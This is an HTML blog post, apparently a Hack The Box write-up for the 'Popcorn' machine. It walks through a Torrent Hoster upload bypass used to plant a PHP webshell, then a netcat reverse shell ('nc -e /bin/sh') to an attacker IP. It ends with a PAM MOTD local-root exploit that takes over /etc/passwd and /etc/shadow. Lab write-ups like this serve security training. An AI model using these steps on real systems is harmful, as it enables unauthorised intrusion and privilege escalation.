@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Popcorn - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Popcorn</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1729329298645"
+                  >2024-10-19 11:14</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1729446130120"
+                  >2024-10-20 19:42</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p><img src="/_resources/f158396b71c742a2b688347b1f4cad67.png" /></p>
+<div><pre class="hljs"><code>└──╼ $whatweb http://popcorn.htb/
+http://popcorn.htb/ <span class="hljs-comment">[200 OK]</span> Apache<span class="hljs-comment">[2.2.12]</span>, Country<span class="hljs-comment">[RESERVED]</span><span class="hljs-comment">[ZZ]</span>, HTTPServer<span class="hljs-comment">[Ubuntu Linux]</span><span class="hljs-comment">[Apache/2.2.12 (Ubuntu)]</span>, IP<span class="hljs-comment">[10.129.161.86]</span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-variable">$nmap</span> -p- -A <span class="hljs-number">10.129</span>.<span class="hljs-number">161.86</span>
+PORT   STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">5.1</span>p1 Debian <span class="hljs-number">6</span>ubuntu2 (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| ssh-<span class="hljs-symbol">hostkey:</span> 
+|   <span class="hljs-number">1024</span> <span class="hljs-number">3</span><span class="hljs-symbol">e:</span><span class="hljs-symbol">c8:</span><span class="hljs-number">1</span><span class="hljs-symbol">b:</span><span class="hljs-number">15</span><span class="hljs-symbol">:</span><span class="hljs-number">21</span><span class="hljs-symbol">:</span><span class="hljs-number">15</span><span class="hljs-symbol">:</span><span class="hljs-number">50</span><span class="hljs-symbol">:ec</span><span class="hljs-symbol">:</span><span class="hljs-number">6</span><span class="hljs-symbol">e:</span><span class="hljs-number">63</span><span class="hljs-symbol">:bc</span><span class="hljs-symbol">:c5</span><span class="hljs-symbol">:</span><span class="hljs-number">6</span><span class="hljs-symbol">b:</span><span class="hljs-number">80</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">b:</span><span class="hljs-number">38</span> (DSA)
+|_  <span class="hljs-number">2048</span> <span class="hljs-symbol">aa:</span><span class="hljs-number">1</span><span class="hljs-symbol">f:</span><span class="hljs-number">79</span><span class="hljs-symbol">:</span><span class="hljs-number">21</span><span class="hljs-symbol">:b8</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span><span class="hljs-symbol">:f4</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">a:</span><span class="hljs-number">38</span><span class="hljs-symbol">:bd</span><span class="hljs-symbol">:b8</span><span class="hljs-symbol">:</span><span class="hljs-number">05</span><span class="hljs-symbol">:ef</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">a:</span><span class="hljs-number">07</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span>d (RSA)
+<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.2</span>.<span class="hljs-number">12</span>
+|_http-<span class="hljs-symbol">title:</span> Did <span class="hljs-keyword">not</span> follow redirect to <span class="hljs-symbol">http:</span>//popcorn.htb/
+|_http-server-<span class="hljs-symbol">header:</span> Apache/<span class="hljs-number">2.2</span>.<span class="hljs-number">12</span> (Ubuntu)
+Service <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">Host:</span> popcorn.hackthebox.gr; <span class="hljs-symbol">OS:</span> Linux; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel</code></pre></div>
+<p><img src="/_resources/b1aa6dcb60ed440bb44e390d6f7b0377.png" /></p>
+<p>In <code>/test.php</code> we can see all of the configs of the server, screen has just the beginning.</p>
+<p><img src="/_resources/bfdd0f237f5b496aae5b654c27d784ff.png" /></p>
+<p><code>/torrent</code> get’s us Torrent Hoster for 2007.</p>
+<p><img src="/_resources/1cba87beeb384e21ab72c4d698ce7c77.png" /></p>
+<p>The upload button immidietly got my attention. To access this panel we have to create an account, but creating them is not locked, so it’s not a problem.</p>
+<p><img src="/_resources/6eeefa3d8ba3458f96af14c29a7dee63.png" /></p>
+<p>We can upload a .torrent file and make it accessible to others. I tried to edit the data being sent, but my php webshell was not considered a valid torrent file for some reason.</p>
+<p><img src="/_resources/7e2441f7cb664850a558e93345650494.png" /></p>
+<p><img src="/_resources/8cf3a028907046e088add06af7d9a902.png" /></p>
+<p>Pressing <code>Edit torrent</code> get’s us a new window.</p>
+<p><img src="/_resources/67c86cf98bde45a9802ab8ff0acdf234.png" /></p>
+<p>We can get a cool cat for our cool linux distro. Now let’s get even cooler webshell. First I tried changing both content type and file type. Got Invalid file. Then, just file type. Got Invalid file. Lastly…</p>
+<p><img src="/_resources/d94e04f47bd54ee09e54e473aea55b42.png" /></p>
+<p>Looking at a webshell is not considered a nice image on this site, but we can right click it and open in a new tab to see it in its full glory.</p>
+<p><img src="/_resources/8d667eeed7d940da950d9bdfcff8bd55.png" /></p>
+<p><img src="/_resources/74fb86eaf0ce4fdb8a7e898c9ecaeae5.png" /></p>
+<p>Running <code>ls /home</code> gets us home folder for <strong>george</strong>. Unfortunetly he does not have .ssh file in his directory, so we have to run reverse shell.</p>
+<div><pre class="hljs"><code><span class="hljs-comment"># on victim</span>
+<span class="hljs-attribute">nc</span> -e /bin/sh <span class="hljs-number">10.10.16.30</span> <span class="hljs-number">4444</span>
+
+<span class="hljs-comment"># on host</span>
+<span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">4444</span></code></pre></div>
+<p>Shell stabilisationfor Qol.</p>
+<div><pre class="hljs"><code>python -c <span class="hljs-string">'import pty;pty.spawn("bash")'</span>
+^Z
+stty raw -<span class="hljs-built_in">echo</span> 
+<span class="hljs-built_in">fg</span></code></pre></div>
+<h1 id="priv-esc">Priv Esc</h1>
+<p>Running linpeas get’s us only root for the site.</p>
+<div><pre class="hljs"><code>══════════╣ Searching passwords <span class="hljs-keyword">in</span> config PHP files
+<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/torrent/</span>config.php:	<span class="hljs-variable">$dbpass</span> 	= <span class="hljs-variable">$CFG</span>-&gt;dbPassword;
+<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/torrent/</span>config.php:	<span class="hljs-variable">$dbuser</span> 	= <span class="hljs-variable">$CFG</span>-&gt;dbUserName;
+<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/torrent/</span>config.php:  <span class="hljs-variable">$CFG</span>-&gt;dbPassword = <span class="hljs-string">"SuperSecret!!"</span>;	<span class="hljs-regexp">//</span>db password
+<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/torrent/</span>config.php:  <span class="hljs-variable">$CFG</span>-&gt;dbUserName = <span class="hljs-string">"torrent"</span>;    <span class="hljs-regexp">//</span>db username</code></pre></div>
+<p>Let’s see what we have in home dir.</p>
+<div><pre class="hljs"><code>www-data@popcorn:/home/george$ ls -lar
+total 860
+-rw-r--r--<span class="hljs-number"> 1 </span>george george    <span class="hljs-number"> 33 </span>Oct<span class="hljs-number"> 20 </span>17:51 user.txt
+-rw-r--r--<span class="hljs-number"> 1 </span>george george<span class="hljs-number"> 848727 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>torrenthoster.zip
+-rw-r--r--<span class="hljs-number"> 1 </span>george george     <span class="hljs-number"> 0 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>.sudo_as_admin_successful
+-rw-r--r--<span class="hljs-number"> 1 </span>george george   <span class="hljs-number"> 675 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>.profile
+drwxr-xr-x<span class="hljs-number"> 2 </span>george george  <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>.cache
+-rw-r--r--<span class="hljs-number"> 1 </span>george george  <span class="hljs-number"> 3180 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>.bashrc
+-rw-r--r--<span class="hljs-number"> 1 </span>george george   <span class="hljs-number"> 220 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>.bash_logout
+lrwxrwxrwx<span class="hljs-number"> 1 </span>george george     <span class="hljs-number"> 9 </span>Oct<span class="hljs-number"> 26 </span><span class="hljs-number"> 2020 </span>.bash_history -&gt; /dev/null
+drwxr-xr-x<span class="hljs-number"> 3 </span>root   root    <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>..
+drwxr-xr-x<span class="hljs-number"> 3 </span>george george  <span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 26 </span><span class="hljs-number"> 2023 </span>.
+www-data@popcorn:/home/george$ ls -laR
+.:
+total 860
+drwxr-xr-x<span class="hljs-number"> 3 </span>george george  <span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 26 </span><span class="hljs-number"> 2023 </span>.
+drwxr-xr-x<span class="hljs-number"> 3 </span>root   root    <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>..
+lrwxrwxrwx<span class="hljs-number"> 1 </span>george george     <span class="hljs-number"> 9 </span>Oct<span class="hljs-number"> 26 </span><span class="hljs-number"> 2020 </span>.bash_history -&gt; /dev/null
+-rw-r--r--<span class="hljs-number"> 1 </span>george george   <span class="hljs-number"> 220 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>.bash_logout
+-rw-r--r--<span class="hljs-number"> 1 </span>george george  <span class="hljs-number"> 3180 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>.bashrc
+drwxr-xr-x<span class="hljs-number"> 2 </span>george george  <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>.cache
+-rw-r--r--<span class="hljs-number"> 1 </span>george george   <span class="hljs-number"> 675 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>.profile
+-rw-r--r--<span class="hljs-number"> 1 </span>george george     <span class="hljs-number"> 0 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>.sudo_as_admin_successful
+-rw-r--r--<span class="hljs-number"> 1 </span>george george<span class="hljs-number"> 848727 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>torrenthoster.zip
+-rw-r--r--<span class="hljs-number"> 1 </span>george george    <span class="hljs-number"> 33 </span>Oct<span class="hljs-number"> 20 </span>17:51 user.txt
+
+./.cache:
+total 8
+drwxr-xr-x<span class="hljs-number"> 2 </span>george george<span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>.
+drwxr-xr-x<span class="hljs-number"> 3 </span>george george<span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 26 </span><span class="hljs-number"> 2023 </span>..
+-rw-r--r--<span class="hljs-number"> 1 </span>george george   <span class="hljs-number"> 0 </span>Mar<span class="hljs-number"> 17 </span><span class="hljs-number"> 2017 </span>motd.legal-displayed</code></pre></div>
+<p>The only thing that not standard is the <code>motd.legal-displayed</code>.</p>
+<p><strong>motd.legal-displayed</strong> is a parameter related to the “Message of the Day” (MOTD) on Linux systems, specifically Ubuntu or other Debian-based distributions. MOTD is a message that is displayed to users when they log into the system via a terminal or SSH.</p>
+<p>Looking at <a title="https://www.exploit-db.com/exploits/14273" href="https://www.exploit-db.com/exploits/14273">exploit-db</a> we can see that it allows us to get root quite easily. I tested it and it works flawlessly.</p>
+<div><pre class="hljs"><code>www-data@popcorn:~$ ./script 
+[*] Ubuntu PAM MOTD local root
+[*] Backuped <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/.ssh/</span>authorized_keys
+[*] SSH key set up
+[*] Backuped <span class="hljs-regexp">/var/</span>www/.cache
+[*] spawn ssh
+[+] owned: <span class="hljs-regexp">/etc/</span>passwd
+[*] spawn ssh
+[+] owned: <span class="hljs-regexp">/etc/</span>shadow
+[*] Restored <span class="hljs-regexp">/var/</span>www/.cache
+[*] Restored <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/.ssh/</span>authorized_keys
+[*] SSH key removed
+[+] Success! Use password toor to get root
+Password: 
+root@popcorn:<span class="hljs-regexp">/var/</span>www<span class="hljs-comment"># ls</span>
+backup  index.html  pwn  rename  script  test.php  torrent
+root@popcorn:<span class="hljs-regexp">/var/</span>www<span class="hljs-comment"># cd /root</span>
+root@popcorn:~<span class="hljs-comment"># ls</span>
+root.txt</code></pre></div>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
